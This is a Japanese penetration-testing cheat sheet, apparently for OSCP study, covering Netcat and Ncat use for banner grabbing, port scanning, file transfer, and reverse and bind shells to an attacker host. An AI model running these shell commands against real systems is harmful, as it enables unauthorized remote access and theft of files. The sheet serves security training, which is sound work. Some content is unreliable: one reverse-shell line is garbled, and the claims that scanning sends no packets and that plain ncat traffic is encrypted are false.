Netcat（nc）およびその進化版であるNcatは、ネットワーク接続の読み書きを行う「ネットワークのスイスアーミーナイフ」として、ペンテストのあらゆるフェーズで活用されます。以下に、主要な調査手法とコマンド例をまとめます。

## 1. 偵察およびバナーグラビング

特定のポートで稼働しているサービスの詳細やバージョンを特定するために使用します。

- **基本バナーグラビング:** `nc -nv <IP> <Port>` を実行して、接続時にサービスが返す応答を確認します。
    
- **特定プロトコルの調査:**
    
    - **SSH (Port 22):** `nc -vn <IP> 22`。
        
    - **SMTP (Port 25):** `nc <IP> 25` を開き、`VRFY root` などのコマンドを試行します。
        
    - **LDAP (Port 389):** `nc -vn <IP> 389` で応答を確認します。
        
    - **Oracle TNS:** `echo "(CONNECT_DATA=(COMMAND=version))" | nc <IP> 1521` でTNSバージョンを取得できます。
        

## 2. ポートスキャニング

Nmapが使用できない環境や、迅速な確認が必要な場合に有効です。

- **TCPポートスキャン:** `nc -vnz <IP> <Port-Range>` (例: `nc -vnz 192.168.1.23 0-1000`) で、パケットを送信せずにオープンポートをスキャンします 。
    

## 3. ファイル転送

外部ツールを導入せずに、ターゲットと攻撃者の間でファイルを送受信します 。

- **受信側 (Listener):** `nc -lvp 1234 > file_name`
    
- **送信側 (Sender):** `nc -vn <IP> 1234 < file_to_send`
    
- **Ncatによる転送:** `cat file.txt | ncat -v -l -p 5555` でホストし、`ncat <Host-IP> 5555 > file_copy.txt` でダウンロードします 。
    

### 4. リバースシェルの実行

ターゲットから攻撃者へのシェル接続を確立します。

- **標準的な実行 (`-e` オプションがある場合):**
    
    - Linux: `nc -e /bin/bash <Attacker-IP> <Port>`
        
    - Windows: `nc -e cmd.exe <Attacker-IP> <Port>`
        
- **`-e` オプションがない場合の代替手段 (FIFO/パイプ使用):**
    
    - `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <Port> > /tmp/f`
        
    - `rm -f /tmp/p; mknod /tmp/p p && nc <IP> <Port> 0/tmp/p`
        
- **リスナーの待機:** 攻撃側で `nc -lvnp <Port>` を実行して接続を待ち受けます。
    

### 5. 高度な機能 (Ncat)

Nmapプロジェクトの一部であるNcatは、標準のNetcatに加えて以下の機能をサポートします。

- **暗号化通信:** `ncat -nv <IP> <Port>` で暗号化されたチャットや通信が可能です 。
    
- **リモートスクリプト実行:** `ncat -v -l -p <Port> -e /bin/bash` を用いて、接続者にシェルを提供します 。
    

OSCP等の試験や実戦では、システムの標準コマンドとして `which nc` や `which netcat` を実行し、利用可能なバイナリとパスをまず確認することが推奨されます 。